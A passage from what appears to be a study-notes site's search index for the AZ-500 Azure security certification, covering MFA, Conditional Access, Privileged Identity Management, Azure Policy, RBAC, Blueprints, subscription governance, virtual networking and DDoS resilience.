</ul> <p>How to deploy MFA</p> <p>To enable MFA, go to the User Properties in Azure Active Directory, and then the Multi-Factor Authentication option. From there, you can select the users that you want to modify and enable for MFA. You can also bulk enable groups of users with PowerShell. User's states can be\u00a0Enabled,\u00a0Enforced, or\u00a0Disabled.</p> <p>Azure AD Multi-Factor Authentication is included free of charge for global administrator security. Enabling MFA for global administrators provides an added level of security when managing and creating Azure resources like virtual machines, managing storage, or using other Azure services. Secondary authentication includes phone call, text message, and the authenticator app. Remember, you can only enable MFA for organizational accounts stored in Azure Active Directory. These are also called work or school accounts.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#34-azure-ad-conditional-access","title":"3.4. Azure AD Conditional Access","text":"<p>Conditional Access is the tool used by Azure Active Directory to bring signals together, to make decisions, and enforce organizational policies. Conditional Access policies at their simplest are if-then statements, if a user wants to access a resource, then they must complete an action. Conditional Access policies are enforced after the first-factor authentication has been completed. Conditional Access is not intended as an organization's first line of defense for scenarios like denial-of-service (DoS) attacks but can use signals from these events to determine access.</p> <p>Conditional Access is at the heart of the new\u00a0identity driven control plane. Identity as a Service\u2014the new control plane</p> <p>Conditional access comes with six conditions: user/group, cloud application, device state, location (IP range), client application, and sign-in risk.</p> <p></p> <p>With access controls, you can either Block Access altogether or Grant Access with more requirements: </p> <ul> <li>Require MFA from Azure AD or an on-premises MFA (combined with AD FS).</li> <li>Grant access to only trusted devices.</li> <li>Require a domain-joined device.</li> <li>Require mobile devices to use Intune app protection policies.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#35-azure-active-directory-azure-ad-access-reviews","title":"3.5. Azure Active Directory (Azure AD) access reviews","text":"<p>Navigate to\u00a0Azure Active Directory (or Microsoft Entra ID) &gt; Identity Governance. Select Access reviews.</p> <p>Azure Active Directory (Azure AD) access reviews enable organizations to efficiently manage group memberships, access to enterprise applications, and role assignments.</p> <p>Use access reviews in the following cases:</p> <ul> <li>Too many users in privileged roles: It's a good idea to check how many users have administrative access, how many of them are Global Administrators, and if there are any invited guests or partners that have not been removed after being assigned to do an administrative task. You can recertify the role assignment users in Azure AD roles such as Global Administrators, or Azure resources roles such as User Access Administrator in the Azure AD Privileged Identity Management (PIM) experience.</li> <li>When automation is infeasible: You can create rules for dynamic membership on security groups or Microsoft 365 Groups, but what if the HR data is not in Azure AD or if users still need access after leaving the group to train their replacement? You can then create a review on that group to ensure those who still need access should have continued access.</li> <li>When a group is used for a new purpose: If you have a group that is going to be synced to Azure AD, or if you plan to enable a sales management application for everyone in the Sales team group, it would be useful to ask the group owner to review the group membership prior to the group being used in a different risk content.</li> <li>Business critical data access: for certain resources, it might be required to ask people outside of IT to regularly sign out and give a justification on why they need access for auditing purposes.</li> <li>To maintain a policy's exception list: In an ideal world, all users would follow the access policies to secure access to your organization's resources. However, sometimes there are business cases that require you to make exceptions. As the IT admin, you can manage this task, avoid oversight of policy exceptions, and provide auditors with proof that these exceptions are reviewed regularly.</li> <li>Ask group owners to confirm they still need guests in their groups: Employee access might be automated with some on premises IAM, but not invited guests. If a group gives guests access to business sensitive content, then it's the group owner's responsibility to confirm the guests still have a legitimate business need for access.</li> <li>Have reviews recur periodically: You can set up recurring access reviews of users at set frequencies such as weekly, monthly, quarterly or annually, and the reviewers will be notified at the start of each review. Reviewers can approve or deny access with a friendly interface and with the help of smart recommendations.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#4-microsoft-entra-privileged-identity-management-pim","title":"4. Microsoft Entra Privileged Identity Management (PIM)","text":"<p>Using this feature requires Azure AD Premium P2 licenses. Azure AD Privileged Identity Management (PIM) allows you to manage, control, and monitor access to the most important resources in your organization. You can give just-in-time access and just-enough-access to users to allow them to do their tasks. Privileged Identity Management provides time-based and approval-based role activation to mitigate the risks of excessive, unnecessary, or misused access permissions on resources you care about. Here are some of the key features of Privileged Identity Management:</p> <ul> <li>Provide just-in-time privileged access to Azure AD and Azure resources</li> <li>Assign time-bound access to resources using start and end dates</li> <li>Require approval to activate privileged roles</li> <li>Enforce multi-factor authentication to activate any role</li> <li>Use justification to understand why users activate</li> <li>Get notifications when privileged roles are activated</li> <li>Conduct access reviews to ensure users still need roles</li> <li>Download audit history for internal or external audit</li> <li>Prevents removal of the last active Global Administrator and Privileged Role Administrator role assignments</li> </ul> <p>Zero Trust model principles: </p> <ul> <li>Verify explicitly\u00a0- Always authenticate and authorize based on all available data points.</li> <li>Use least privilege access\u00a0- Limit user access with Just-In-Time and Just-Enough-Access (JIT/JEA), risk-based adaptive policies, and data protection.</li> <li>Assume breach\u00a0- Minimize blast radius and segment access. Verify end-to-end encryption and use analytics to get visibility, drive threat detection, and improve defenses.</li> </ul> <p>Zero Trust model Architecture: </p> <p>The primary components of this process are Intune for device management and device security policy configuration, Azure AD conditional access for device health validation, and Azure AD for user and device inventory. The system works with Intune, pushing device configuration requirements to the managed devices. The device then generates a statement of health, which is stored in Azure AD. When the device user requests access to a resource, the device health state is verified as part of the authentication exchange with Azure AD.</p> <p>How does Privileged Identity Management work?</p> <p>Once you set up Privileged Identity Management, you'll see Tasks, Manage, and Activity options in the left navigation menu. As an administrator, you'll choose between options such as managing Azure AD roles, managing Azure resource roles, or PIM for Groups. When you choose what you want to manage, you see the appropriate set of options for that option.</p> <p>Azure AD roles:</p> <ul> <li>Can manage Azure AD: Privileged Role Administrator, and Global Administrator roles.</li> <li>Can read  Azure AD roles:  Global Administrators, Security Administrators, Global Readers, and Security Readers roles</li> </ul> <p>Azure AD resources: - can be managed by:  Subscription Administrator, Resource Owner, and Resource User Access Administrator roles.  - can not even be read by: Privileged Role Administrators, Security Administrators, or Security Readers roles </p> <p>Make sure there are always at least two users in a Privileged Role Administrator role, in case one user is locked out or their account is deleted.</p> <p>When creating an assignment, something that I didn't know in the setting up: - Type of the assignment     - Eligible assignments require the member of the role to perform an action to use the role. Actions might include activation or requesting approval from designated approvers.     - Active assignments don't require the member to perform any action to use the role. Members assigned as active have the privileges assigned to the role.</p> <p>How activates a role?  If users have been made eligible for a role, then they must activate the role assignment before using the role. To activate the role, users select a specific activation duration within the maximum (configured by administrators) and the reason for the activation request. If the role requires approval to activate, a notification will appear in the upper right corner of the user's browser, informing them the request is pending approval. If approval isn't required, the member can start using the role. Delegated approvers receive email notifications when a role request is pending their approval. Approvers can view, approve or deny these pending requests in PIM. After the request has been approved, the member can start using the role. For example, if a user or a group was assigned with Contribution role to a resource group, they'll be able to manage that particular resource group.</p> <p>To extend or  renew assignments, it's required approval from a Global Administrator or Privileged Role Administrator. Notifications can be sent to Admins, Requestors, and Approvers.</p> <p>Privileged Role Administrator permissions</p> <ul> <li>Enable approval for specific roles</li> <li>Specify approver users or groups to approve requests</li> <li>View request and approval history for all privileged roles</li> </ul> <p>Approver permissions</p> <ul> <li>View pending approvals (requests)</li> <li>Approve or reject requests for role elevation (single and bulk)</li> <li>Provide justification for my approval or rejection</li> </ul> <p>Eligible role user permissions</p> <ul> <li>Request activation of a role that requires approval</li> <li>View the status of your request to activate</li> <li>Complete your task in Azure AD if activation was approved</li> </ul> <p>Assignment settings: </p> <ul> <li>Allow permanent eligible assignment. Global admins and Privileged role admins can assign permanent eligible assignment. They can also require that all eligible assignments have a specified start and end date.</li> <li>Allow permanent active assignment. Global admins and Privileged role admins can assign active eligible assignment. They can also require that all active assignments have a specified start and end date.</li> </ul> <p>Implement a privileged identity management workflow</p> <p>By configuring Azure AD PIM to manage our elevated access roles in Azure AD, we now have JIT access for more than 28 configurable privileged roles. We can also monitor access, audit account elevations, and receive additional alerts through a management dashboard in the Azure portal.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#5-design-an-enterprise-governance-strategy-azure-resource-manager","title":"5. Design an Enterprise Governance strategy: Azure Resource Manager","text":"<p>Regardless of the deployment type,\u00a0you always retain responsibility for the following:</p> <ul> <li>Data</li> <li>Endpoints</li> <li>Accounts</li> <li>Access management</li> </ul> <p>Azure Resource Manager\u00a0is the deployment and management service for Azure. It provides a consistent management layer that allows you to create, update, and delete resources in your Azure subscription. You can use its access control, auditing, and tagging features to help secure and organize your resources after deployment.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#51-resource-groups","title":"5.1. Resource Groups","text":"<p>Resource Groups -  There are some important factors to consider when defining your resource group:</p> <ul> <li>All the resources in your group should share the same lifecycle. You deploy, update, and delete them together. If one resource, such as a database server, needs to exist on a different deployment cycle it should be in another resource group.</li> <li>Each resource can only exist in one resource group.</li> <li>You can add or remove a resource to a resource group at any time.</li> <li>You can move a resource from one resource group to another group.</li> <li>A resource group can contain resources that are located in different regions.</li> <li>A resource group can be used to scope access control for administrative actions.</li> <li>A resource can interact with resources in other resource groups. This interaction is common when the two resources are related but don't share the same lifecycle (for example, web apps connecting to a database).</li> <li>If the resource group's region is temporarily unavailable, you can't update resources in the resource group because the metadata is unavailable. The resources in other regions will still function as expected, but you can't update them.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#52-management-groups","title":"5.2. Management Groups","text":"<ul> <li>Provide user access to multiple subscriptions</li> <li>Allows for new organizational models and logically grouping of resources.</li> <li>Allows for single assignment of controls that applies to all subscriptions.</li> <li>Provides aggregated views above the subscription level.</li> </ul> <p>Mirror your organization's structure - Create a flexible hierarchy that can be updated quickly. - The hierarchy does not need to model the organization's billing hierarchy. - The structure can easily scale up or down depending on your needs.</p> <p>Apply policies or access controls to any service - Create one RBAC assignment on the management group, which will inherit that access to all the subscriptions. - Use Azure Resource Manager integrations that allow integrations with other Azure services: Azure Cost Management, Privileged Identity Management, and Microsoft Defender for Cloud.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#53-azure-policies","title":"5.3. Azure policies","text":"<p>Configure Azure policies - Azure Policy is a service you use to create, assign, and manage policies. These policies enforce different rules and effects over your resources so that those resources stay compliant with your corporate standards and service level agreements.</p> <p></p> <p>The\u00a0first pillar\u00a0is around\u00a0real-time enforcement and compliance assessment.</p> <p>The\u00a0second pillar\u00a0of policy is\u00a0applying policies at scale\u00a0by leveraging Management Groups. There also is the concept called\u00a0policy initiative\u00a0that allows you to group policies together so that you can view the aggregated compliance result. At the initiative level there's also a concept called exclusion where one can exclude either the child management group, subscription, resource group, or resources from the policy assignment.</p> <p>The\u00a0third pillar\u00a0of your policy is\u00a0remediation by leveraging a remediation policy\u00a0that will automatically remediate the non-compliant resource so that your environment always stays compliant. For existing resources, they will be flagged as non-compliant but they won't automatically be changed because there can be impact to the environment.</p> <p>Some built-in roles in Azure Policy resources:</p> <ul> <li>Resource Policy Owner</li> <li>Resource Policy Contributor</li> <li>Resource Policy Reader</li> </ul> <p>There are two resource providers for Azure Policy operations (or permissions):</p> <ul> <li>Microsoft.Authorization</li> <li>Microsoft.PolicyInsights</li> </ul> <p>If a custom policy is needed these are the steps:</p> <ul> <li>Identify your business requirements</li> <li>Map each requirement to an Azure resource property</li> <li>Map the property to an alias</li> <li>Determine which effect to use</li> <li>Compose the policy definition</li> </ul> <p>Let's do it:</p> <ul> <li>Policy definition\u00a0- Every policy definition has conditions under which it's enforced. And, it has a defined effect that takes place if the conditions are met.</li> <li>Policy assignment\u00a0- A policy definition that has been assigned to take place within a specific scope. This scope could range from a management group to an individual resource. The term scope refers to all the resources, resource groups, subscriptions, or management groups that the policy definition is assigned to.</li> <li>Policy parameters\u00a0- They help simplify your policy management by reducing the number of policy definitions you must create. You can define parameters when creating a policy definition to make it more generic.</li> </ul> <p>In order to easily track compliance for multiple resources, create and assign an\u00a0Initiative definition.</p> <p>All Policy objects, including definitions, initiatives, and assignments, will be readable to all roles over its scope. For example, a Policy assignment scoped to an Azure subscription will be readable by all role holders at the subscription scope and below.</p> <p>A\u00a0contributor\u00a0may trigger resource remediation but can't create or update definitions and assignments.\u00a0User Access Administrator\u00a0is necessary to grant the managed identity on\u00a0deployIfNotExists\u00a0or\u00a0modify\u00a0the assignment's necessary permissions.</p> <p>Each policy definition in Azure Policy has a single effect. That effect determines what happens when the policy rule is evaluated to match. The effects behave differently if they are for a new resource, an updated resource, or an existing resource.</p> <p>These effects are currently supported in a policy definition:</p> <ul> <li>Append</li> <li>Audit</li> <li>AuditIfNotExists</li> <li>Deny</li> <li>DenyAction</li> <li>DeployIfNotExists</li> <li>Disabled</li> <li>Manual</li> <li>Modify</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#54-enable-role-based-access-control-rbac","title":"5.4. Enable Role-Based Access Control (RBAC)","text":"<p>RBAC is an authorization system built on Azure Resource Manager that provides fine-grained access management of Azure resources. Each Azure subscription is associated with one Azure AD directory. Users, groups, and applications in that directory can manage resources in the Azure subscription. Grant access by assigning the appropriate RBAC role to users, groups, and applications at a certain scope. The scope of a role assignment can be a subscription, a resource group, or a single resource.</p> <p>Note that a subscription is associated with only one Azure AD tenant. Also note that a resource group can have multiple resources but is associated with only one subscription. Lastly, a resource can be bound to only one resource group.</p> <p>The four general built-in roles are:</p> Built-in Role Description Contributor Grants full access to manage all resources, but does not allow you to assign roles in Azure RBAC, manage assignments in Azure Blueprints, or share image galleries. Owner Grants full access to manage all resources, including the ability to assign roles in Azure RBAC. Reader View all resources, but does not allow you to make any changes. User Access Administrator Lets you manage user access to Azure resources. <p>If the built-in roles for Azure resources don't meet the specific needs of your organization, you can create your own custom roles. Just like built-in roles, you can assign custom roles to users, groups, and service principals at management group, subscription, and resource group scopes.</p> <p>Limits for custom roles.</p> <ul> <li>Each directory can have up to\u00a05000\u00a0custom roles.</li> <li>Azure Germany and Azure China 21Vianet can have up to 2000 custom roles for each directory.</li> <li>You cannot set AssignableScopes to the root scope (\"/\").</li> <li>You can only define one management group in AssignableScopes of a custom role. Adding a management group to AssignableScopes is currently in preview.</li> <li>Custom roles with DataActions cannot be assigned at the management group scope.</li> <li>Azure Resource Manager doesn't validate the management group's existence in the role definition's assignable scope.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#55-enable-resource-locks","title":"5.5. Enable resource locks","text":"<p>You can set the lock level to\u00a0CanNotDelete or ReadOnly. In the portal, the locks are called\u00a0Delete and Read-only\u00a0respectively.</p> <ul> <li>CanNotDelete\u00a0means authorized users can still read and modify a resource, but they can't delete the resource.</li> <li>ReadOnly\u00a0means authorized users can read a resource, but they can't delete or update the resource. Applying this lock is similar to restricting all authorized users to the permissions granted by the Reader role.</li> </ul> <p>To create or delete management locks, you must have access to <code>Microsoft.Authorization/*</code>or\u00a0<code>Microsoft.Authorization/locks/*</code>\u00a0actions. Of the built-in roles, only\u00a0Owner\u00a0and\u00a0User Access Administrator\u00a0are granted those actions.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#56-deploy-azure-blueprints","title":"5.6. Deploy Azure blueprints","text":"<p>Blueprints are a declarative way to orchestrate the deployment of various resource templates and other artifacts, such as:</p> <ul> <li>Role Assignments</li> <li>Policy Assignments</li> <li>Azure Resource Manager templates</li> <li>Resource Groups</li> </ul> <p>The Azure Blueprints service is supported by the globally distributed Azure Cosmos Data Base. Blueprint objects are replicated in multiple Azure regions. This replication provides\u00a0low latency,\u00a0high availability, and\u00a0consistent access\u00a0to your blueprint objects, regardless of which region Blueprints deploys your resources to.</p> <p>The Azure Resource Manager template gets used for deployments of one or more Azure resources, but once those resources deploy, there's no active connection or relationship to the template. Blueprints save the relationship between the blueprint definition and the blueprint assignment. This connection supports improved tracking and auditing of deployments. Each blueprint can consist of zero or more Resource Manager template artifacts. This support means that previous efforts to develop and maintain a library of Resource Manager templates are reusable in Blueprints.</p> <p>Blueprint definition - A blueprint is composed of\u00a0artifacts. Azure Blueprints currently supports the following resources as artifacts:</p> Resource Hierarchy options Description Resource Groups Subscription Create a new resource group for use by other artifacts within the blueprint. These placeholder resource groups enable you to organize resources exactly how you want them structured and provide a scope limiter for included policy and role assignment artifacts and ARM templates. ARM template Subscription, Resource Group Templates, including nested and linked templates, are used to compose complex environments. Example environments: a SharePoint farm, Azure Automation State Configuration, or a Log Analytics workspace. Policy Assignment Subscription, Resource Group Allows assignment of a policy or initiative to the subscription the blueprint is assigned to. The policy or initiative must be within the scope of the blueprint definition location. If the policy or initiative has parameters, these parameters are assigned at the creation of the blueprint or during blueprint assignment. Role Assignment Subscription, Resource Group Add an existing user or group to a built-in role to make sure the right people always have the right access to your resources. Role assignments can be defined for the entire subscription or nested to a specific resource group included in the blueprint. <p>Blueprint definition locations - When creating a blueprint definition, you'll define where the blueprint is saved. Blueprints can be saved to a\u00a0management group\u00a0or\u00a0subscription\u00a0that you have\u00a0Contributor access\u00a0to. If the location is a management group, the blueprint is available to assign to any child subscription of that management group.</p> <p>Blueprint parameters - Blueprints can pass parameters to either a\u00a0policy/initiative\u00a0or an\u00a0ARM template. When adding either\u00a0artifact\u00a0to a blueprint, the author decides to provide a defined value for each blueprint assignment or to allow each blueprint assignment to provide a value at assignment time.</p> <p>Assigning a blueprint definition to a management group means the assignment object exists in the management group. The deployment of artifacts still targets a subscription. To perform a management group assignment, the\u00a0Create\u00a0Or\u00a0Update REST API\u00a0must be used, and the request body must include a value for\u00a0properties.scope\u00a0to define the target subscription.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#57-design-an-azure-subscription-management-plan","title":"5.7. Design an Azure subscription management plan","text":"<p>Capturing subscription requirements and designing target subscriptions include several factors which are based on:</p> <ul> <li>environment type</li> <li>ownership and governance model</li> <li>organizational structure</li> <li>application portfolios</li> </ul> <p>Organization and governance design considerations</p> <ul> <li>Subscriptions serve as boundaries for Azure Policy assignments. - For example, in the Payment Card Industry.</li> <li>Subscriptions serve as a scale unit so component workloads can scale within platform subscription limits. </li> <li>Subscriptions provide a management boundary for governance and isolation that clearly separates concerns.</li> <li>Create separate platform subscriptions for management (monitoring), connectivity, and identity when they're required.</li> <li>Use manual processes to limit Azure AD tenants to only Enterprise Agreement enrollment subscriptions.</li> <li>See the Azure subscription and reservation transfer hub for subscription transfers between Azure billing offers.</li> </ul> <p>Quota and capacity design considerations</p> <p>Azure regions might have a finite number of resources. As a result, available capacity and Stock-keeping units (SKUs) should be tracked for Azure adoptions involving a large number of resources.</p> <ul> <li>Consider limits and quotas within the Azure platform for each service your workloads require.</li> <li>Consider the availability of required SKUs within your chosen Azure regions. </li> <li>Consider that subscription quotas aren't capacity guarantees and are applied on a per-region basis.</li> <li>Consider reusing unused or decommissioned subscriptions.</li> </ul> <p>Tenant transfer restriction design considerations</p> <ul> <li>Each Azure subscription is linked to a single Azure AD tenant, which acts as an identity provider (IdP) for your Azure subscription. The Azure AD tenant is used to authenticate users, services, and devices.</li> <li>The Azure AD tenant linked to your Azure subscription can be changed by any user with the required permissions.</li> </ul> <p>Transferring to another Azure AD tenant is not supported for Azure Cloud Solution Provider (CSP) subscriptions.</p> <ul> <li>With Azure landing zones, you can set requirements to prevent users from transferring subscriptions to your organization's Azure AD tenant.\u00a0Review the process in Manage Azure subscription policies. Configure your subscription policy by providing a list of exempted users. Exempted users are permitted to bypass restrictions set in the policy. An exempted users list is not an Azure Policy. You can only specify individual user accounts as exempted users, not Azure AD groups.</li> <li>Consider whether users with Visual Studio/MSDN Azure subscriptions should be allowed to transfer their subscription to or from your Azure AD tenant.</li> <li> <p>Tenant transfer settings are only configurable by users with the Azure AD Global Administrator role assigned. </p> </li> <li> <p>All users with access to Azure can view the policy defined for your Azure AD tenant.</p> <ul> <li>Users can't view your exempted users list.</li> <li>Users can view the global administrators within your Azure AD tenant.</li> </ul> </li> <li> <p>Azure subscriptions transferred into an Azure AD tenant are placed into the default management group for that tenant.</p> </li> <li>If approved by your organization, your application team can define a process to allow Azure subscriptions to be transferred to or from an Azure AD tenant.</li> </ul> <p>Establish cost management design considerations</p> <ul> <li>Cost transparency is a critical management challenge every large enterprise organization faces. T</li> <li>Chargeback models, like Azure App Service Environment and Azure Kubernetes Service, might need to be shared to achieve higher density. Shared\u00a0platform as a service (PaaS)\u00a0resources can be affected by Chargeback models.</li> <li>Use a shutdown schedule for nonproduction workloads to optimize costs.</li> <li>Use Azure Advisor to check recommendations for optimizing costs.</li> <li>Establish a charge back model for better distribution of cost across your organization.</li> <li>Implement policy to prevent the deployment of resources not authorized to be deployed in your organization's environment.</li> <li>Establish a regular schedule and cadence to review cost and right size resources for workloads.</li> </ul> <p>Organization and governance recommendations</p> <ul> <li>Treat subscriptions as a unit of management aligned with your business needs and priorities.</li> <li>Make subscription owners aware of their roles and responsibilities.<ul> <li>Do a quarterly or yearly access review for Azure AD Privileged Identity Management to ensure that privileges don't proliferate as users move within your organization.</li> <li>Take full ownership of budget spending and resources.</li> <li>Ensure policy compliance and remediate when necessary.</li> </ul> </li> <li>Reference the following principles as you identify requirements for new subscriptions:<ul> <li>Scale limits: Subscriptions serve as a scale unit for component workloads to scale within platform subscription limits. Large specialized workloads like\u00a0high-performance computing,\u00a0Internet of Things (IoT), and\u00a0System Analysis Program Development (SAP)\u00a0should use separate subscriptions to avoid running up against these limits.</li> <li>Management boundary: Subscriptions provide a management boundary for governance and isolation, allowing a clear separation of concerns. Different environments, such as development, test, and production, are often removed from a management perspective.</li> <li>Policy boundary: Subscriptions serve as a boundary for the Azure Policy assignments. For example, secure workloads like PCI typically require other policies in order to achieve compliance. The other overhead doesn't get considered if you use a separate subscription. Development environments have more relaxed policy requirements than production environments.</li> <li>Target network topology: You can't share virtual networks across subscriptions, but you can connect them with different technologies like\u00a0virtual network peering or\u00a0Azure ExpressRoute. When deciding if you need a new subscription, consider which workloads need to communicate with each other.</li> </ul> </li> <li>Group subscriptions together under management groups, which are aligned with your management group structure and policy requirements. Grouping subscriptions ensures that subscriptions with the same set of policies and Azure role assignments all come from a management group.</li> <li>Establish a dedicated management subscription in your\u00a0Platform\u00a0management group to support global management capabilities like Azure Monitor Log Analytics workspaces and Azure Automation runbooks.</li> <li>Establish a dedicated identity subscription in your\u00a0Platform\u00a0management group to host Windows Server Active Directory domain controllers when necessary.</li> <li>Establish a dedicated connectivity subscription in your\u00a0Platform\u00a0management group to host an\u00a0Azure Virtual WAN hub,\u00a0private Domain Name System (DNS),\u00a0ExpressRoute circuit, and other networking resources. A dedicated subscription ensures that all your foundation network resources are billed together and isolated from other workloads.</li> <li>Avoid a rigid subscription model. Instead, use a set of flexible criteria to group subscriptions across your organization. </li> </ul> <p>Quota and capacity recommendations</p> <ul> <li>Use subscriptions as scale units, and scale out resources and subscriptions as required. Your workload can then use the required resources for scaling out without hitting subscription limits in the Azure platform.</li> <li>Use reserved instances to manage capacity in some regions. Your workload can then have the required capacity for high demand resources in a specific region.</li> <li>Establish a dashboard with custom views to monitor used capacity levels, and set up alerts if capacity is approaching critical levels (90 percent CPU usage).</li> <li>Raise support requests for quota increases under subscription provisioning, such as for total available VM cores within a subscription. Ensure that your quota limits are set before your workloads exceed the default limits.</li> <li>Ensure that any required services and features are available within your chosen deployment regions.</li> </ul> <p>Automation recommendations</p> <ul> <li>Build a Subscription vending process to automate the creation of Subscriptions for application teams via a request workflow as described in\u00a0Subscription vending.</li> </ul> <p>Tenant transfer restriction recommendations</p> <ul> <li>Configure the following settings to prevent users from transferring Azure subscriptions to or from your Azure AD tenant:<ul> <li>Set Subscription leaving Azure AD directory to Permit no one.</li> <li>Set Subscription entering Azure AD directory to Permit no one.</li> </ul> </li> <li>Configure a limited list of exempted users.<ul> <li>Include members from an Azure PlatformOps (platform operations) team.</li> <li>Include break-glass accounts in the list of exempted users.</li> </ul> </li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/","title":"II. Platform protection","text":"Sources of this notes <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - MCA Microsoft Certified Associate Azure Security Engineer Study Guide: Exam AZ-500. </li> <li>Udemy course:  AZ-500 Microsoft Azure Security Technologies Exam Prep.</li> <li>Udemy course: Azure Security: AZ-500 (updated July 2023)</li> </ul> Summary: AZ-500 Microsoft Azure Security Engineer Certification <ul> <li>About the certificate</li> <li>I. Manage Identity and Access</li> <li>II. Platform protection</li> <li>III. Data and applications</li> <li>IV. Security operations</li> <li>AZ-500 and more: keep learning</li> </ul> <p>Cheatsheets: Azure-CLI | Azure PowerShell </p> <p>100 questions you should pass for the AZ-500 certificate </p> <p>This entire sections is about implementing security with a defense in depth approach in mind.</p> <p></p> <ul> <li>Azure Network Security Groups\u00a0can be used for basic layer 3 &amp; 4 access controls between Azure Virtual Networks, their subnets, and the Internet.</li> <li>Application Security Groups\u00a0enable you to define fine-grained network security policies based on workloads, centralized on applications, instead of explicit IP addresses.</li> <li>Azure Web Application Firewall\u00a0and the\u00a0Azure Firewall\u00a0can be used for more advanced network access controls that require application layer support.</li> <li>Local Admin Password Solution (LAPS)\u00a0or a third-party Privileged Access Management can set strong local admin passwords and just in time access to them.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#1-perimeter-security","title":"1. Perimeter security","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#11-azure-networking-components","title":"1.1. Azure networking components","text":"<p>Azure Virtual Networks are a key component of Azure security services. The Azure network infrastructure enables you to securely connect Azure resources to each other with virtual networks (VNets). A VNet is a representation of your own network in the cloud. A VNet is a logical isolation of the Azure cloud network dedicated to your subscription. You can connect VNets to your on-premises networks.</p> <p>Azure supports\u00a0dedicated WAN link connectivity\u00a0to your on-premises network and an Azure Virtual Network with ExpressRoute. The link between Azure and your site uses a dedicated connection that does not go over the public Internet.</p> <p>Virtual networks</p> <p>Virtual networks in Azure are network overlays that you can use to configure and control the connectivity among Azure resources, such as VMs and load balancers. A virtual network is scoped to a single Azure region. Virtual networks are made up of subnets. A subnet is a range of IP addresses within your virtual network. Subnets, like virtual networks, are scoped to a single Azure region.  You can implement multiple virtual networks within each Azure subscription and Azure region. Each virtual network is isolated from other virtual networks. For each virtual network you can: - Specify a custom private IP address space using public and private addresses. Azure assigns resources in a virtual network a private IP address from the address space that you assign. - Segment the virtual network into one or more subnets and allocate a portion of the virtual network's address space to each subnet. - Use Azure-provided name resolution, or specify your own DNS server, for use by resources in a virtual network.</p> <p>IP addresses</p> <p>VMs, Azure load balancers, and application gateways in a single virtual network require unique Internet Protocol (IP) addresses the same way that clients in an on-premises subnet do. This enables these resources to communicate with each other: - Private\u00a0- A private IP address is dynamically or statically allocated to a VM from the defined scope of IP addresses in the virtual network. VMs use these addresses to communicate with other VMs in the same or connected virtual networks through a gateway / Azure ExpressRoute connection. These private IP addresses, or non-routable IP addresses, conform to RFC 1918. - Public\u00a0- Public IP addresses, which allow Azure resources to communicate with external clients, are assigned directly at the virtual network adapter of the VM or to the load balancer. Public IP address can also be added to Azure-only virtual networks. All IP blocks in the virtual network will be routable only within the customer's network, and they won't be reachable from outside. Virtual network packets travel through the high-speed Azure backplane.</p> <p>You can control the dynamic IP addresses assigned to VMs and cloud services within an Azure virtual network by specifying an IP addressing scheme.</p> <p>Subnets</p> <p>Each subnet contains a range of IP addresses that fall within the virtual network address space. Subnetting hides the details of internal network organization from external routers. Subnetting also segments the host within the network, making it easier to apply network security at the interconnections between subnets.</p> <p>Network adapters</p> <p>VMs communicate with other VMs and other resources on the network by using virtual network adapters. Virtual network adapters configure VMs with private and, optionally, public IP address. A VM can have more than one network adapter for different network configurations.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#12-azure-distributed-denial-of-service-ddos-protection","title":"1.2. Azure Distributed Denial of Service (DDoS) Protection","text":"<p>Best practices for building DDoS-resilient services in Azure:</p> <p>1. Ensure that security is a priority throughout the entire lifecycle of an application, from design and implementation to deployment and operations. Applications might have bugs that allow a relatively low volume of requests to use a lot of resources, resulting in a service outage.</p> <p>For this, take into account these pillars: - Scalability - The ability of a system to handle increased load. - Availability - The proportion of time that a system is functional and working. - Resiliency - The ability of a system to recover from failures and continue to function. - Management - Operations processes that keep a system running in production. - Security - Protecting applications and data from threats</p> <p>2. Design your applications to scale horizontally to meet the demands of an amplified load\u2014specifically, in the event of a DDoS. If your application depends on a single instance of a service, it creates a single point of failure. Provisioning multiple instances makes your system more resilient and more scalable.</p> <p>For this, these are valid ways to address it: - For Azure App Service, select an App Service plan that offers multiple instances. - For Azure Cloud Services, configure each of your roles to use multiple instances. - For Azure Virtual Machines, ensure that your VM architecture includes more than one VM and that each VM is included in an availability set. We recommend using virtual machine scale sets for autoscaling capabilities.</p> <p>3. Layer security defenses in an application to reduce the chance of a successful attack. Implement security-enhanced designs for your applications by using the built-in capabilities of the Azure platform.</p> <p>This would be an approach to address it: Be aware that the risk of attack increases with the size, or surface area, of the application. You can reduce the surface area by using IP allowlists to close down the exposed IP address space and listening ports that aren\u2019t needed on the load balancers (for Azure Load Balancer and Azure Application Gateway). \u200eYou can also use NSGs to reduce the attack surface. You can use service tags and application security groups as a natural extension of an application\u2019s structure to minimize complexity for creating security rules and configuring network security.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#configure-a-distributed-denial-of-service-protection-implementation","title":"Configure a distributed denial of service protection implementation","text":"<p>Azure Distributed Denial of Service (DDoS) protection, combined with application design best practices, provide defense against DDoS attacks. Azure DDoS protection provides the following service 